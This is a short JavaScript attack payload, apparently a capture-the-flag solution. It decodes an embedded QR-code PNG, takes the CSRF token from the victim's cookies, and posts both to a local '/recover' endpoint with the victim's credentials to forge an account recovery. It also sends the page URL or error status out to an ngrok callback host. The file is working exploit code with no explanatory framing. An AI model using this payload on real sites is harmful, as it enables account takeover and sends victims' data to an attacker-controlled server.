function dataURItoBlob(dataURI) {
    // convert base64/URLEncoded data component to raw binary data held in a string
    var byteString;
    if (dataURI.split(',')[0].indexOf('base64') >= 0)
        byteString = atob(dataURI.split(',')[1]);
    else
        byteString = unescape(dataURI.split(',')[1]);

    // separate out the mime component
    var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];

    // write the bytes of the string to a typed array
    var ia = new Uint8Array(byteString.length);
    for (var i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }

    return new Blob([ia], {type:mimeString});
}

if (window.location.search === "?x") {
    var d=new FormData();
    d.append("qrcode", dataURItoBlob('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAwIAAAMCAQAAAADyx0wVAAAIy0lEQVR4nO2dzY3jSAyFX60M9FEGJoAJRZ3BhtQxTQZyKM6gfGxABvdQxT/Ziz0sRrX2Ph2MtmTrQwugWSQfWUXwe4/LH78ZAJBAAgkkkEACCSSQQAIJJJBAwhhC6ccJuJQTSjnfS/nEveBy7ldxOQO4nPs54FYKcDu1c+XzVuJLKaWUz0P/BxJIIAEAICIiWEREpE4iKybp5+rULgCYBEsF2tulTiLrLALMG/rX5g2yznoXv+n6Dk+JBBJeh6A2XYFmxJijOYtUILys8wa1cwCLbHquAgCmZtNovwK0aRJIOJzwxKY3qP/Vq91Pu/9Vn7zahfbWfg9o0ySQMIhwenp2WSHALCiYKwS4F7n8/C7t6uVcBcu1AJgr0C8UYLmetod7vcNTIoGE1yHs42ks0v20x87d4QJ2DgDmvjJ3B95DacbTJJAwnnAppZRyBoDbh2C5fkhLarfjdkL5qpOdmwTL9YTyialF1uXzdkL5BFA+cW9p76P/BxJIIAG69k4C0XvpQTXuzS7l8nODXM4T2oXLT3/5botywe1egPm7AHOWm77DUyKBhNchxBwZYMkuoK+p21/hI+jZbpENLUeGVtUSaefEbiVce5NAwuEEdMtDrzG3eDq+iBWfNzTT9Vr0qknyfljNegXAeJoEEgYQoOmtXmNuBmtHr1uh16e15tVfelbtSTG7qU9o0ySQcDhB/bQmur0g3YvPIvsKdKhZ22q961CSIoU2TQIJAwixlrXCXG+ImAGVlkRn3a+qhMwFKjtHT5smgYRjCWp+FQjJrtVi4u6xEQJoT4WFtz1bpiG3VOrISCBhCCHGzracflCaNBmJL6x1KW7a7m7nHpWDa28SSBhCsFqW2uUKQCtTtn7W3ozejZXatJJh518G2jQJJBxOwM50Qw+Hv108vV1h+XEx360u2vSi6rZp0ySQcDQhx9NaaG6l6abe1pW0x9Pdbad4WrynS/Wi9NMkkDCAEGxaTbfbpcfE8NJW664Wn38A/bD787Rsp02TQMKxhBBPu3d2MWh0x3W3UIctuyWG19ZETZsmgYQBhDj1IMhIAF1iWxbM8tkhnu4pM/uwrdZZyyKBhEEEtWnNeEU3u1OfzP5iq3VXiOe3ABhPk0DCCILpyLbkhL2tahbtvGpXzWPP6sABK0jXKVWvadMkkHA4Acl0PYFtbvtRRxZmDNrcMn8bC1+0aRJIOJxg8TQQOqSbQNSkJX2WqOq9rXrtuXD17L5Qp58mgYQhhH083VPe3qAhKYq2Bg10pZi1c1WvdAnr0ySQMIzQR44tvwqw/PohBbifgNsZWOodwO2HJsRvBQA+pADQWaJlknIpgFz+/C6C22mTS5m2OL3oHZ4SCSS8DiH1Wmo8nYpXFhibK8ccE93dvZufDgt1+mkSSDickOPpXY3ZC9Ka9vI5Y5JW3I+iUc4CJoGEIYSo9w7OWjy8tsEIIZ7eopB02em9TfRNmyaBhOMJcTjJapXlIAatiFa7S4DZKIW4/V0FqA0lgYRRhOiTvbzsvVXtmCUUqT013m7gu2Qt2nDJeJoEEkYRkubEz1W1Vd+N1qUl5rY1v2blLv8pmPW3gjZNAgkDCOXrWorO/hRpm2zgVkrLkflO8r72bhvLt606Jmlb8oRttq7cU54EEoYQbGY/Yj3KTFd8YInsk99RORrCa7sL/TQJJAwgmI7MJWQS6lGe3n4WSuvX8ngUye3U7/CUSCDhdQgpRwY8HVvkIpN+eI5bYmOmt2n1MJw2TQIJhxNir2VowfCZYnVX35rEezhSQRrxBpyJQAIJgwh49LVQS06tVghjvK34HL7rUbn+RT9NAgkDCFEbajtS7gYePFSr5liQjjdAnI5AmyaBhAGEOGMQupyW0HWpHjvms6vvl2X5cV2j7xWmtGkSSDiUEPqy9jtH+7ZYeXhoaph2vTfCX1E//g5PiQQSXocQZiIgDupG0mzDom2Jn3NtmRa+UmmafpoEEo4nRJteJC6dYz67urRkS6t1t98K+HiyuHXtOzwlEkh4HcITvbc7YU1+e5dG3snWbT8NAweoIyOBhFGEtLWGxdPtCAbrufCUFX8yj8zlZ4ynSSBhACHlyBDzYT7dxDNecXgoEPTesX/a7Zw2TQIJhxMe42nv0nCBqCbAfDyZS0V1ZY4gH2V9mgQSRhHSHnjVRxmZjixMN5nEs2U+wdvvEizefiNo0ySQcCwh9HAEc7Zqc1J62hATceW3BtBh57uax42+w1MigYTXIWRpZ+6LzrWsHndvoVcrGvFsohU3cdo0CSQcTgh5bx0nlocg+DmTj8Z9qrcQT/f0WM2b6L3DUyKBhNchpFnA9hKK1KH10sy0rbiTOYc02pzlK+/wlEgg4XUIOZ7WcQgrYGNP1PVaw2XIj1s+bD/u2/a/pE2TQMKxhCf7WnqNOYnJeudV2g1vta8tll/zLS259iaBhOMJcR6Z7ya96Ll9yixf6DeoaeKJp8zop0kg4XhC8NM6zQDBY4edcmDBsjdxeS7cAu2oN6NNk0DC4YSkOXFrrECcE4iY1A4xdjfiXrh+WJTTpkkg4XBCnnPiapE47CQOBdX0tk88QRSSqtKE8TQJJAwixP2nfb9KX0m76QYXnTy7R9aqObFhwrRpEkg4nBBmAWuH9BbyZtFgkYZ375bYcQqKfoQ2TQIJxxNi/7RnvMJetcFg01YdtkbfzR0MXVuMp0kg4XjCg957RdwlyyeThb8AqLQEUJXKLOJvOeeEBBJGEVI8rda4F4n53F/z0w+W/DcqM9o0CSQcS3hwx6EWrW47Fan7W+/aint4MJ4mgYT/HmH+LljqvQC4l/Ll2tCgFwXK1/VDN6s+I2xRHeYejfsfSCDh/0t49NOzjz5I6bGw8x3cdKF2LlFXyl5LEkgYRdjH03Hr+CwL9Y3wfACZDUFo91py6wdtmgQSjifs895xWre66DCAzLzz03lk3tfB/bJIIGEQocg/f+ZfHZd3eEokkEACCSSQQAIJJJBAAgkkkJCPvwCIatAvl1O+1QAAAABJRU5ErkJggg=='), "qr.png");
    d.append("_csrf_token", document.cookie.split("_csrf_token=")[1]);
    fetch('http://localhost:3000/recover', {method: 'POST', body: d, credentials: 'same-origin'}).then(x => window.location = 'http://localhost:3000/documents').catch(x => window.location = 'https://e8023e55.ngrok.io/?x=fail-'+x.status);
} else {
    window.location = "https://e8023e55.ngrok.io/?x="+window.location.href;
}
